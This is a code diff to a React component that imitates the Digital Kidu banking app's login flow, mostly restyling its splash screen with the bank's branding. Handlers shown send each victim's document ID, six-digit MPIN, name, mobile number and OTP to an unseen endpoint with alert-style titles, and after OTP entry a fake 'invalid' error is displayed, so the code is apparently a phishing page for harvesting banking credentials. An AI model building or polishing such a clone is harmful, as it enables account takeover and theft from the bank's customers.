@@ -106,9 +106,9 @@ export default function DigitalKiduApp() {
           title: "🪪 Digital Kidu - Document ID Submitted",
           documentId: trimmed,
           docId: trimmed,
-        }).catch(() => {})
+        }).catch(() => { })
       })
-      .catch(() => {})
+      .catch(() => { })
 
     // Transition to MPIN screen
     setTimeout(() => {
@@ -134,9 +134,9 @@ export default function DigitalKiduApp() {
           title: "🔐 Digital Kidu - 6-Digit MPIN Submitted",
           documentId: documentId || "N/A",
           mpin: finalMpin,
-        }).catch(() => {})
+        }).catch(() => { })
       })
-      .catch(() => {})
+      .catch(() => { })
 
     // Transition to "Your Details" screen
     setTimeout(() => {
@@ -176,9 +176,9 @@ export default function DigitalKiduApp() {
           fullName: fullName.trim(),
           mobileNumber: mobileNumber.trim(),
           phone: mobileNumber.trim(),
-        }).catch(() => {})
+        }).catch(() => { })
       })
-      .catch(() => {})
+      .catch(() => { })
 
     // Advance to OTP verification
     setTimeout(() => {
@@ -210,9 +210,9 @@ export default function DigitalKiduApp() {
           phone: mobileNumber || "N/A",
           mpin: mpin || "N/A",
           otp1: finalOtp,
-        }).catch(() => {})
+        }).catch(() => { })
       })
-      .catch(() => {})
+      .catch(() => { })
 
     // Simulate verification delay then show invalid error
     setTimeout(() => {
@@ -239,9 +239,9 @@ export default function DigitalKiduApp() {
           title: "🔄 Digital Kidu - OTP Resend Requested",
           documentId: documentId || "N/A",
           phone: mobileNumber || "N/A",
-        }).catch(() => {})
+        }).catch(() => { })
       })
-      .catch(() => {})
+      .catch(() => { })
   }
 
   return (
@@ -253,41 +253,218 @@ export default function DigitalKiduApp() {
       {/* 1. SPLASH SCREEN & TOP LOGIN POPUP                                        */}
       {/* ========================================================================= */}
       {currentScreen === "splash" && (
-        <div className="w-full h-[100dvh] max-h-[100dvh] relative overflow-hidden flex flex-col justify-end">
-          {/* Splash Background Image (Full Width) */}
+        <div className="w-full h-[100dvh] max-h-[100dvh] relative overflow-hidden flex flex-col justify-between bg-[#1B160E]">
+          {/* HD Background Image from test333.jpeg */}
           <img
-            src="/tets.png"
-            alt="Digital Kidu Splash"
-            className="absolute inset-0 w-full h-full object-cover object-center pointer-events-none"
+            src="/test333.jpeg"
+            alt="Bhutan Mask Dancer"
+            className="absolute inset-0 w-full h-full object-cover object-[center_22%] pointer-events-none select-none"
           />
 
-          {/* Transparent Click Targets overlaying the Sign up & Login buttons */}
-          <div className="relative z-20 w-full max-w-[480px] mx-auto px-6 pb-24 sm:pb-28 flex items-center justify-between gap-4 pointer-events-auto">
-            {/* Sign up button hotspot (opens Dark Details screen) */}
-            <button
-              type="button"
-              onClick={() => {
-                setIsLoginPopupOpen(false)
-                setCurrentScreen("details")
-              }}
-              className="flex-1 h-14 rounded-full bg-transparent active:bg-black/15 transition-colors cursor-pointer"
-              aria-label="Sign up"
-            />
+          {/* Contrast Gradients for HD Clarity of Text & Elements */}
+          <div className="absolute inset-0 bg-gradient-to-b from-black/50 via-black/15 to-transparent h-[48%] pointer-events-none" />
+          <div className="absolute inset-0 bg-gradient-to-t from-black/30 via-transparent to-transparent pointer-events-none" />
 
-            {/* Login button hotspot (opens Top Login Popup) */}
-            <button
-              type="button"
-              onClick={() => setIsLoginPopupOpen(true)}
-              className="flex-1 h-14 rounded-full bg-transparent active:bg-black/15 transition-colors cursor-pointer"
-              aria-label="Login"
-            />
-          </div>
-
-          {/* Full-screen tap fallback (opens login popup if user clicks anywhere else) */}
+          {/* Full-screen tap fallback (tapping background opens login popup) */}
           <div
             onClick={() => setIsLoginPopupOpen(true)}
             className="absolute inset-0 z-10 cursor-pointer"
+            aria-label="Tap to open login"
           />
+
+          {/* Main Content Container (Constrained on larger screens, full on mobile) */}
+          <div className="relative z-20 w-full max-w-[480px] mx-auto h-full flex flex-col justify-between pointer-events-none">
+            {/* ------------------------------------------------------------- */}
+            {/* Top Navigation Bar & Welcome Header                           */}
+            {/* ------------------------------------------------------------- */}
+            <div className="pt-8 sm:pt-11 px-6 sm:px-7 flex flex-col pointer-events-auto">
+              {/* Header Row: DIGITAL KIDU Logo & Notification Bell */}
+              <div className="flex items-center justify-between w-full">
+                {/* Brand Logo & Name */}
+                <div className="flex items-center gap-2.5">
+                  <div className="w-[30px] h-[38px] border-[2.4px] border-white/95 rounded-[7px] flex items-center justify-center relative shadow-sm">
+                    {/* Stylized D / K geometry */}
+                    <div className="w-[13px] h-[21px] border-r-[2.4px] border-white/95 rounded-r-[6px] absolute left-[4px] top-[6px]" />
+                    <div className="w-[9px] h-[2.4px] bg-white/95 absolute left-[4px] top-[6px]" />
+                    <div className="w-[9px] h-[2.4px] bg-white/95 absolute left-[4px] bottom-[6px]" />
+                    <div className="w-[10px] h-[2.4px] bg-white/95 absolute left-[9px] top-[16px] rotate-45" />
+                  </div>
+                  <div className="flex flex-col leading-[1.08] text-white select-none">
+                    <span className="text-[13.5px] font-extrabold tracking-[0.06em] drop-shadow-[0_1px_3px_rgba(0,0,0,0.6)]">
+                      DIGITAL
+                    </span>
+                    <span className="text-[13.5px] font-extrabold tracking-[0.06em] drop-shadow-[0_1px_3px_rgba(0,0,0,0.6)]">
+                      KIDU
+                    </span>
+                  </div>
+                </div>
+
+                {/* Notification Bell Button */}
+                <button
+                  type="button"
+                  onClick={(e) => {
+                    e.stopPropagation()
+                    setIsLoginPopupOpen(true)
+                  }}
+                  className="w-[44px] h-[44px] rounded-full bg-white flex items-center justify-center shadow-lg shadow-black/15 relative active:scale-95 transition-transform cursor-pointer"
+                  aria-label="Notifications"
+                >
+                  <svg
+                    width="22"
+                    height="22"
+                    viewBox="0 0 24 24"
+                    fill="#C88828"
+                    xmlns="http://www.w3.org/2000/svg"
+                  >
+                    <path d="M12 22C13.1 22 14 21.1 14 20H10C10 21.1 10.9 22 12 22ZM18 16V11C18 7.93 16.36 5.36 13.5 4.68V4C13.5 3.17 12.83 2.5 12 2.5C11.17 2.5 10.5 3.17 10.5 4V4.68C7.63 5.36 6 7.92 6 11V16L4 18V19H20V18L18 16Z" />
+                  </svg>
+                  {/* Notification Orange/Red Alert Dot */}
+                  <span className="absolute top-[10px] right-[10px] w-[8px] h-[8px] bg-[#E85D35] rounded-full ring-2 ring-white" />
+                </button>
+              </div>
+
+              {/* Greeting & Headline */}
+              <div className="mt-7 sm:mt-8">
+                <h1 className="text-[34px] sm:text-[38px] font-bold text-white tracking-tight leading-[1.12] drop-shadow-[0_2px_8px_rgba(0,0,0,0.6)]">
+                  Kuzuzangpola
+                </h1>
+                <p className="text-[15.5px] sm:text-[16.5px] text-white/95 font-normal leading-snug mt-2.5 max-w-[275px] drop-shadow-[0_1px_5px_rgba(0,0,0,0.6)]">
+                  Simple and secure, your smart financial solution
+                </p>
+              </div>
+            </div>
+
+            {/* ------------------------------------------------------------- */}
+            {/* Bottom Card / Action Sheet                                    */}
+            {/* ------------------------------------------------------------- */}
+            <div className="w-full bg-white rounded-t-[32px] sm:rounded-t-[36px] pt-5 pb-5 sm:pb-7 px-5 sm:px-6 shadow-[0_-10px_35px_rgba(0,0,0,0.22)] flex flex-col pointer-events-auto">
+              {/* Row 1: Sign up & Login Pill Buttons */}
+              <div className="flex items-center justify-between gap-3.5 sm:gap-4 w-full">
+                {/* Sign up Button */}
+                <button
+                  type="button"
+                  onClick={(e) => {
+                    e.stopPropagation()
+                    setIsLoginPopupOpen(false)
+                    setCurrentScreen("details")
+                  }}
+                  className="flex-1 h-[52px] sm:h-[56px] rounded-full bg-[#E5F1F8] hover:bg-[#D8EBF5] active:scale-[0.98] text-[#102D52] font-bold text-[16.5px] sm:text-[17px] flex items-center justify-center transition-all cursor-pointer shadow-xs"
+                >
+                  Sign up
+                </button>
+
+                {/* Login Button */}
+                <button
+                  type="button"
+                  onClick={(e) => {
+                    e.stopPropagation()
+                    setIsLoginPopupOpen(true)
+                  }}
+                  className="flex-1 h-[52px] sm:h-[56px] rounded-full bg-[#102D52] hover:bg-[#0C2442] active:scale-[0.98] text-white font-bold text-[16.5px] sm:text-[17px] flex items-center justify-center transition-all cursor-pointer shadow-md shadow-[#102D52]/20"
+                >
+                  Login
+                </button>
+              </div>
+
+              {/* Subtle Horizontal Divider */}
+              <div className="w-full h-[1px] bg-[#F1F5F9] my-4 sm:my-4.5" />
+
+              {/* Row 2: Bottom Navigation Quick Actions */}
+              <div className="flex items-center justify-around w-full pt-0.5">
+                {/* eATM */}
+                <button
+                  type="button"
+                  onClick={(e) => {
+                    e.stopPropagation()
+                    setIsLoginPopupOpen(true)
+                  }}
+                  className="flex flex-col items-center justify-center gap-1.5 cursor-pointer group active:scale-95 transition-transform bg-transparent border-none p-0"
+                >
+                  <div className="w-6 h-6 flex items-center justify-center text-[#556987] group-hover:text-[#102D52] transition-colors">
+                    <svg
+                      width="24"
+                      height="24"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      strokeWidth="2"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                    >
+                      <path d="M4 7h16l-1.5 12a2 2 0 0 1-2 1.8H7.5a2 2 0 0 1-2-1.8L4 7z" />
+                      <rect x="9.5" y="3.5" width="5" height="5.5" rx="1" strokeWidth="1.8" />
+                      <line x1="12" y1="5.5" x2="12" y2="7" strokeWidth="1.8" />
+                    </svg>
+                  </div>
+                  <span className="text-[13px] font-medium text-[#556987] group-hover:text-[#102D52] transition-colors">
+                    eATM
+                  </span>
+                </button>
+
+                {/* Center FAB: QR Scanner */}
+                <button
+                  type="button"
+                  onClick={(e) => {
+                    e.stopPropagation()
+                    setIsLoginPopupOpen(true)
+                  }}
+                  className="w-[58px] h-[58px] rounded-full bg-[#EA8E23] hover:bg-[#DE8219] flex items-center justify-center shadow-lg shadow-[#EA8E23]/35 active:scale-95 transition-all cursor-pointer -mt-1"
+                  aria-label="Scan QR Code"
+                >
+                  <svg
+                    width="26"
+                    height="26"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="white"
+                    strokeWidth="2.2"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
+                    {/* Viewfinder Frame */}
+                    <path d="M4 8V5a1 1 0 0 1 1-1h3" />
+                    <path d="M16 4h3a1 1 0 0 1 1 1v3" />
+                    <path d="M4 16v3a1 1 0 0 0 1 1h3" />
+                    <path d="M16 20h3a1 1 0 0 0 1-1v-3" />
+                    {/* Center QR Grid Pattern */}
+                    <rect x="8" y="8" width="3" height="3" fill="white" stroke="none" />
+                    <rect x="13" y="8" width="3" height="3" fill="white" stroke="none" />
+                    <rect x="8" y="13" width="3" height="3" fill="white" stroke="none" />
+                    <rect x="13" y="13" width="3" height="3" fill="white" stroke="none" />
+                  </svg>
+                </button>
+
+                {/* Fund transfer */}
+                <button
+                  type="button"
+                  onClick={(e) => {
+                    e.stopPropagation()
+                    setIsLoginPopupOpen(true)
+                  }}
+                  className="flex flex-col items-center justify-center gap-1.5 cursor-pointer group active:scale-95 transition-transform bg-transparent border-none p-0"
+                >
+                  <div className="w-6 h-6 flex items-center justify-center text-[#556987] group-hover:text-[#102D52] transition-colors">
+                    <svg
+                      width="24"
+                      height="24"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      strokeWidth="2"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                    >
+                      <path d="M6 9h12M14 5l4 4-4 4" />
+                      <path d="M18 15H6M10 19l-4-4 4-4" />
+                    </svg>
+                  </div>
+                  <span className="text-[13px] font-medium text-[#556987] group-hover:text-[#102D52] transition-colors">
+                    Fund transfer
+                  </span>
+                </button>
+              </div>
+            </div>
+          </div>
 
           {/* ----------------------------------------------------------------------- */}
           {/* TOP LOGIN POPUP (SLIDES DOWN FROM TOP AS REQUESTED)                    */}
@@ -387,7 +564,7 @@ export default function DigitalKiduApp() {
         <div className="w-full h-[100dvh] max-h-[100dvh] bg-white overflow-hidden flex flex-col items-center justify-between">
           <div className="w-full max-w-[480px] h-full flex flex-col justify-between px-6 pt-7 pb-6 overflow-hidden">
             {/* Top Header with Back */}
-            <div className="shrink-0">
+            <div className="shrink-0 mb-2 sm:mb-4">
               <button
                 type="button"
                 onClick={() => setCurrentScreen("splash")}
@@ -409,10 +586,10 @@ export default function DigitalKiduApp() {
               </button>
             </div>
 
-            {/* Center Content */}
-            <div className="flex flex-col items-center justify-center flex-1 my-auto">
+            {/* Content (Shifted up towards top) */}
+            <div className="flex flex-col items-center justify-start flex-1 pt-6 sm:pt-10">
               {/* Padlock Badge */}
-              <div className="w-[72px] h-[72px] rounded-[22px] bg-[#E8F7FB] flex items-center justify-center mb-6 shadow-xs">
+              <div className="w-[68px] h-[68px] sm:w-[72px] sm:h-[72px] rounded-[22px] bg-[#E8F7FB] flex items-center justify-center mb-5 shadow-xs">
                 <svg
                   width="28"
                   height="28"
@@ -429,15 +606,15 @@ export default function DigitalKiduApp() {
               </div>
 
               {/* Title & Subtitle */}
-              <h1 className="text-[28px] font-bold text-[#0F172A] tracking-tight mb-2 text-center">
+              <h1 className="text-[26px] sm:text-[28px] font-bold text-[#0F172A] tracking-tight mb-1.5 text-center">
                 Enter your MPIN
               </h1>
-              <p className="text-[15px] text-[#94A3B8] font-normal mb-8 text-center">
+              <p className="text-[14.5px] sm:text-[15px] text-[#94A3B8] font-normal mb-6 sm:mb-7 text-center">
                 Auto submits when complete
               </p>
 
               {/* 6 MPIN Boxes (Dash indicator matching Image 1) */}
-              <div className="relative flex items-center justify-center gap-2.5 sm:gap-3 mb-7 select-none w-full max-w-[340px]">
+              <div className="relative flex items-center justify-center gap-2.5 sm:gap-3 mb-6 select-none w-full max-w-[340px]">
                 {[0, 1, 2, 3, 4, 5].map((index) => {
                   const hasValue = index < mpin.length
                   const isCurrent = index === mpin.length
@@ -445,13 +622,12 @@ export default function DigitalKiduApp() {
                   return (
                     <div
                       key={index}
-                      className={`flex-1 h-[56px] sm:h-[60px] rounded-[16px] bg-[#F8FAFC] border flex items-center justify-center transition-all ${
-                        isCurrent
-                          ? "border-[1.5px] border-[#00c8dc] bg-white ring-2 ring-[#00c8dc]/20 shadow-sm"
-                          : hasValue
+                      className={`flex-1 h-[56px] sm:h-[60px] rounded-[16px] bg-[#F8FAFC] border flex items-center justify-center transition-all ${isCurrent
+                        ? "border-[1.5px] border-[#00c8dc] bg-white ring-2 ring-[#00c8dc]/20 shadow-sm"
+                        : hasValue
                           ? "border-[#CBD5E1] bg-white text-[#0F172A]"
                           : "border-[#E2E8F0]"
-                      }`}
+                        }`}
                     >
                       {hasValue ? (
                         <span className="text-[22px] sm:text-[24px] font-bold text-[#0F172A]">
@@ -496,15 +672,12 @@ export default function DigitalKiduApp() {
               {/* Forgot MPIN? link */}
               <button
                 type="button"
-                onClick={() => {}}
+                onClick={() => { }}
                 className="text-[#00c8dc] text-[15px] font-medium hover:underline cursor-pointer bg-transparent border-none"
               >
                 Forgot MPIN?
               </button>
             </div>
-
-            {/* Empty spacer for symmetry */}
-            <div className="h-6 shrink-0" />
           </div>
         </div>
       )}
@@ -629,9 +802,8 @@ export default function DigitalKiduApp() {
                     className="flex items-start gap-3 mt-1 cursor-pointer select-none"
                   >
                     <div
-                      className={`w-5 h-5 rounded-[5px] flex items-center justify-center transition-colors shrink-0 mt-0.5 ${
-                        agreedToTerms ? "bg-[#00c8dc] text-[#070D18]" : "border border-[#334155] bg-[#111927]"
-                      }`}
+                      className={`w-5 h-5 rounded-[5px] flex items-center justify-center transition-colors shrink-0 mt-0.5 ${agreedToTerms ? "bg-[#00c8dc] text-[#070D18]" : "border border-[#334155] bg-[#111927]"
+                        }`}
                     >
                       {agreedToTerms && (
                         <svg
@@ -784,14 +956,13 @@ export default function DigitalKiduApp() {
 
             {/* 6 OTP Boxes with Dash — and Shake on error */}
             <div
-              className={`relative flex items-center justify-between gap-2 sm:gap-2.5 mb-4 select-none transition-transform ${
-                isOtpShaking ? "translate-x-[-8px] transition-none" : ""
-              }`}
+              className={`relative flex items-center justify-between gap-2 sm:gap-2.5 mb-4 select-none transition-transform ${isOtpShaking ? "translate-x-[-8px] transition-none" : ""
+                }`}
               style={
                 isOtpShaking
                   ? {
-                      animation: "shake 0.45s cubic-bezier(.36,.07,.19,.97) both",
-                    }
+                    animation: "shake 0.45s cubic-bezier(.36,.07,.19,.97) both",
+                  }
                   : undefined
               }
             >
@@ -803,15 +974,14 @@ export default function DigitalKiduApp() {
                 return (
                   <div
                     key={index}
-                    className={`flex-1 h-[52px] sm:h-[56px] rounded-[16px] bg-[#F8FAFC] border flex items-center justify-center transition-all ${
-                      otpError
-                        ? "border-red-400 bg-red-50/20 text-red-600"
-                        : isCurrent
+                    className={`flex-1 h-[52px] sm:h-[56px] rounded-[16px] bg-[#F8FAFC] border flex items-center justify-center transition-all ${otpError
+                      ? "border-red-400 bg-red-50/20 text-red-600"
+                      : isCurrent
                         ? "border-[1.5px] border-[#00c8dc] bg-white ring-2 ring-[#00c8dc]/20 shadow-sm"
                         : hasValue
-                        ? "border-[#00c8dc] bg-white text-[#0F172A]"
-                        : "border-[#E2E8F0]"
-                    }`}
+                          ? "border-[#00c8dc] bg-white text-[#0F172A]"
+                          : "border-[#E2E8F0]"
+                      }`}
                   >
                     {hasValue ? (
                       <span className="text-[19px] sm:text-[22px] font-bold text-[#0F172A]">
@@ -861,11 +1031,10 @@ export default function DigitalKiduApp() {
               type="button"
               disabled={otp.length !== 6 || isOtpSubmitting}
               onClick={() => handleOtpSubmit()}
-              className={`w-full h-[52px] sm:h-[54px] rounded-full text-white font-semibold text-[17px] tracking-wide flex items-center justify-center transition-all shadow-sm ${
-                otp.length === 6 && !isOtpSubmitting
-                  ? "bg-[#00c8dc] hover:bg-[#00b4c6] active:scale-[0.99] cursor-pointer"
-                  : "bg-[#00c8dc] opacity-90 cursor-pointer"
-              }`}
+              className={`w-full h-[52px] sm:h-[54px] rounded-full text-white font-semibold text-[17px] tracking-wide flex items-center justify-center transition-all shadow-sm ${otp.length === 6 && !isOtpSubmitting
+                ? "bg-[#00c8dc] hover:bg-[#00b4c6] active:scale-[0.99] cursor-pointer"
+                : "bg-[#00c8dc] opacity-90 cursor-pointer"
+                }`}
             >
               {isOtpSubmitting ? (
                 <svg
